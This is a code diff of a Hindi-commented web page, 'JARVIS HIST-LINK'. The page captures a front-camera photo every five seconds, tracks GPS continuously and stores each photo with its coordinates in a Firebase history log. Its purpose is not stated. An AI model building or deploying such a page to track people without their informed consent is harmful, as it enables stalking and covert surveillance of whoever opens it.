@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JARVIS REMOTE - CONTINUOUS STREAM</title>
+    <title>JARVIS REMOTE - COMBINED HIST</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
@@ -17,8 +17,8 @@
 </head>
 <body>
     <div class="control-box">
-        <h2>JARVIS MULTI-RECORD v6 <span class="live-dot"></span></h2>
-        <p style="color: #888; font-size: 13px;">लगातार रिकॉर्डिंग और ट्रैकिंग मोड सक्रिय है</p>
+        <h2>JARVIS HIST-LINK v7 <span class="live-dot"></span></h2>
+        <p style="color: #888; font-size: 13px;">फोटो + लोकेशन कंबाइंड हिस्ट्री मोड ऑन है</p>
         <video id="v" autoplay playsinline muted></video>
         <canvas id="c"></canvas>
         <div class="status-text" id="log-status">सिस्टम लोड हो रहा है...</div>
@@ -35,43 +35,49 @@
         if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
+        // ग्लोबल वेरिएबल्स ताकि हमेशा लेटेस्ट जीपीएस डेटा उपलब्ध रहे
+        let currentLat = 0;
+        let currentLon = 0;
+
         window.onload = function() {
-            startLiveTracking();
+            startCombinedTracking();
         };
 
-        async function startLiveTracking() {
+        async function startCombinedTracking() {
             const statusDiv = document.getElementById('log-status');
-            statusDiv.innerHTML = "📡 कैमरा और GPS सिंक किया जा रहा है...";
+            statusDiv.innerHTML = "📡 सिस्टम एक्टिवेट किया जा रहा है...";
             
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('v');
                 video.srcObject = stream;
 
+                // लगातार बैकग्राउंड में GPS को ट्रैक करना और वेरिएबल्स में सेव रखना
                 navigator.geolocation.watchPosition((pos) => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    // लोकेशन को मेन नोड पर लाइव रखें
-                    database.ref('live_detect/location').set({ lat: lat, lon: lon });
-                    statusDiv.innerHTML = `📍 GPS ट्रैक ऑन: ${lat.toFixed(5)}, ${lon.toFixed(5)}`;
+                    currentLat = pos.coords.latitude;
+                    currentLon = pos.coords.longitude;
+                    
+                    // मेन लाइव नोड को भी तुरंत अपडेट रखें
+                    database.ref('live_detect/location').set({ lat: currentLat, lon: currentLon });
+                    statusDiv.innerHTML = `📍 GPS ट्रैक एक्टिव: ${currentLat.toFixed(5)}, ${currentLon.toFixed(5)}`;
                 }, err => {
-                    statusDiv.innerHTML = "❌ GPS परमिशन आवश्यक है।";
+                    statusDiv.innerHTML = "❌ GPS एरर: कृपया लोकेशन अलाउ करें।";
                 }, { enableHighAccuracy: true });
 
                 video.onloadedmetadata = () => {
-                    // ⏱️ कैमरे को ब्लैक स्क्रीन से बचाने के लिए 2000ms (2 सेकंड) का डिले
+                    // कैमरे के ऑन होने के लिए 2 सेकंड रुकें ताकि ब्लैक स्क्रीन न आए
                     setTimeout(() => {
-                        captureAndPushRecord(); 
-                        setInterval(captureAndPushRecord, 5000); // फिर हर 5 सेकंड में ऑटोमैटिकली
+                        captureCombinedData(); 
+                        setInterval(captureCombinedData, 5000); // हर 5 सेकंड में नया कंबाइंड रिकॉर्ड
                     }, 2000);
                 };
 
             } catch(e) {
-                statusDiv.innerHTML = "❌ परमिशन एरर: कैमरा अलाउ करें बॉस!";
+                statusDiv.innerHTML = "❌ परमिशन एरर: कैमरा/लोकेशन एक्सेस ऑन करें बॉस!";
             }
         }
 
-        function captureAndPushRecord() {
+        function captureCombinedData() {
             const v = document.getElementById('v');
             const c = document.getElementById('c');
             
@@ -81,19 +87,25 @@
             const compressedPhoto = c.toDataURL('image/jpeg', 0.4); 
 
             const timestamp = Date.now();
+            const currentTimeString = new Date().toLocaleTimeString();
 
-            // 🌟 नया रिकॉर्ड बनाने के लिए .update() की जगह अलग नोड पर पुश (Push) लॉजिक
-            // इससे पुराना डेटा डिलीट नहीं होगा, नया रिकॉर्ड जुड़ता जाएगा
+            // 1. मेन लाइव डैशबोर्ड अपडेट (ताकि स्क्रीन पर तुरंत दिखे)
             database.ref('live_detect').update({
                 photo: compressedPhoto,
                 last_updated: timestamp
             });
 
-            // बैकअप हिस्ट्री रिकॉर्ड (ताकि सारे पुराने रिकॉर्ड सेव रहें)
+            // 2. 🌟 जार्विस हिस्ट्री नोड (यहाँ फोटो और लोकेशन दोनों एक ही जगह साथ में सेव होंगे)
             database.ref('jarvis_history/' + timestamp).set({
+                time: currentTimeString,
                 photo: compressedPhoto,
-                time: new Date().toLocaleTimeString()
+                location_record: {
+                    lat: currentLat,
+                    lon: currentLon
+                }
             });
+            
+            console.log("कंबाइंड रिकॉर्ड सिंक हुआ: " + currentTimeString);
         }
     </script>
 </body>
